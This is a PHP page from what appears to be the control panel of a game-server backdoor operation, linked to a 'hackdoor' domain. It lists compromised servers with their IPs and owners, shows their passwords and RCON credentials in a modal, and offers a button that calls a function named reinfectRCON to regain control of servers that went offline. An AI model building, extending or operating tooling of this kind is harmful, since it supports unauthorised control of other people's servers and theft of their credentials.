<?php
include 'core/class/include.php';
$ip = $_SERVER['REMOTE_ADDR'];
    if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
  {
    die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/rVbb2Kx");
  }
// Redirige l'utilisateur si il n'est pas authentifier
if (!Account::isAuthentified())
{
    header('Location: fe15hg6rt1e.php');

    exit();
}

 $color = Account::GetUser()["color"]; 
  $colort = Account::GetUser()["color_second"]; 
 $colorb = Account::GetUser()["color_trois"]; 
 if($colorb == "")
     $colorb = "1a6d7d";
  if($colort == "")
 $colort = "ffffff";
 if($color == "")
 $color = "1c1c1c";
?>
<!DOCTYPE html>
<html lang="en">
<?php
include 'defaultpage.php';
?>

<body id="page-top">

  <!-- Page Wrapper -->
  <div id="wrapper">
  <?php
  include 'defaultnav.php';
  ?>

    <!-- Content Wrapper -->
    <div id="content-wrapper" class="d-flex flex-column">

      <!-- Main Content -->
      <div id="content">
<?php
        include 'defaultnavbar.php';
        ?>

        <!-- Begin Page Content -->
        <div class="container-fluid">

          <!-- Page Heading -->
           <div class="col-lg-10 mb-4 border-left-warning shadow">
                    <div class="card-body">
                    <center>  ⚠️ ATTENTIONS ! ⚠️ Un spam de Reconnection RCON fera laguer le site ! </center>
                    </div>
                  </div>
<div class="card shadow mb-4">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary">Serveurs</h6>
                </div>
                <div class="card-body">
          <div id="server_pfwcejzfn">
    <table id="server_lisst" cellspacing="0" width="100%" class="table">
        <thead> 
            <tr>
                <th><?php echo $lang["servername"]; ?></th>
                <th><?php echo $lang["ipaddress"]; ?></th>
                <th>Port</th>
                <th><?php echo $lang["lastpingdate"]; ?></th>
                <th><?php echo $lang["owner"]; ?></th>
                <th style="min-width: 140px!important;">Action</th>
            </tr>
        </thead>

        <tbody id="ilyadesserveursoff">
          <?php 
          $selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 < time())
    {

                    if($_SESSION['id'] == $AfficheServer['userid'] || IsAdmin($_SESSION['id'])){

                     $button_off_inf = '<a href="http://gblhackdoor.ga/servers#'.$AfficheServer['id'].'" class="btn btn-info btn-sm"><i class="fa fa-trash"></i>&nbsp;Page</a>';
            

        $button_rcon_rst = '<button onclick="reinfectRCON('.$AfficheServer['id'].')" type="button" class="btn btn-primary btn-sm"><i class="fa fa-file-code-o"></i>&nbsp;Reconnecter via RCON</button>';

                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr>
                                <td><b>" . htmlspecialchars($AfficheServer['server_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[0]) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[1]) . "</b></td>
                                <td><b>" . htmlspecialchars(date('d/m/Y à H:i:s', $AfficheServer['last_update'])) . "</b></td>
                                <td><b>" . Account::GetUsername($AfficheServer['userid']) . "</b></td>
                                <td><b>" . $button_rcon_rst . " " . $button_off_inf . "</b></td>
                            </tr>
                        ";
                        } 
                    }
                    }
          ?>
        </tbody>
    </table>
    </div>
</div>
</div>
<div class="modal fade" id="serverinformationoffline-modal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Information sur le server</h4>
      </div>
      <div class="modal-body" id="serverinformation-body">
          <div class="form-group">
            <label>Nom</label>
            <textarea disabled="" class="form-control" rows="1" id="server-name" placeholder="nom du server"></textarea>
          </div>
          <div class="form-group">
            <label>IP</label>
            <textarea disabled="" class="form-control" rows="1" id="server-ip" placeholder="ip du server"></textarea>
          </div>
          <div class="form-group">
            <label>Mot de passe</label>
            <textarea disabled="" class="form-control" rows="1" id="server-pw" placeholder="Le server na pas de mot de passe"></textarea>
          </div>

          <div class="form-group">
            <label>Rcon</label>
            <textarea disabled="" class="form-control" rows="1" id="server-rcon" placeholder="Le server na pas de RCON"></textarea>
          </div>


      </div>
      <div class="modal-footer" id="serverinformationffline-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal">Fermer</button>
      </div>
    </div>
  </div>
</div>

        </div>
        <!-- /.container-fluid -->

      </div>
      <!-- End of Main Content -->

      <!-- Footer -->
      
      <!-- End of Footer -->

    </div>
    <!-- End of Content Wrapper -->

  </div>
  <!-- End of Page Wrapper -->

  <!-- Scroll to Top Button-->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>

  <!-- Logout Modal-->
  <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Etes vous sur de vouloir vous déconnecter ?</h5>
          <button class="close" type="button" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">×</span>
          </button>
        </div>
        <div class="modal-body">Cliquer sur "Deconnexion" pour vous déconnecter.</div>
        <div class="modal-footer">
          <button class="btn btn-secondary" type="button" data-dismiss="modal">Annulé</button>
          <a class="btn btn-primary" href="logout.php">Deconnexion</a>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="js/sb-admin-2.min.js"></script>

</body>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.js"></script>
<script src="js/datatables.bootstrap.js"></script>
<script src="js/custom.js"></script>
<script>
  function copyToClipboard(element) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val($(element).text()).select();
  document.execCommand("copy");
  $temp.remove();
}
</script>
<script>
  setInterval('load_servers()', 1400);
   function load_servers() {
     $('#ilyadesserveursoff').load('listed_ki_tue.php?theget=2');
   }
</script>
</html>
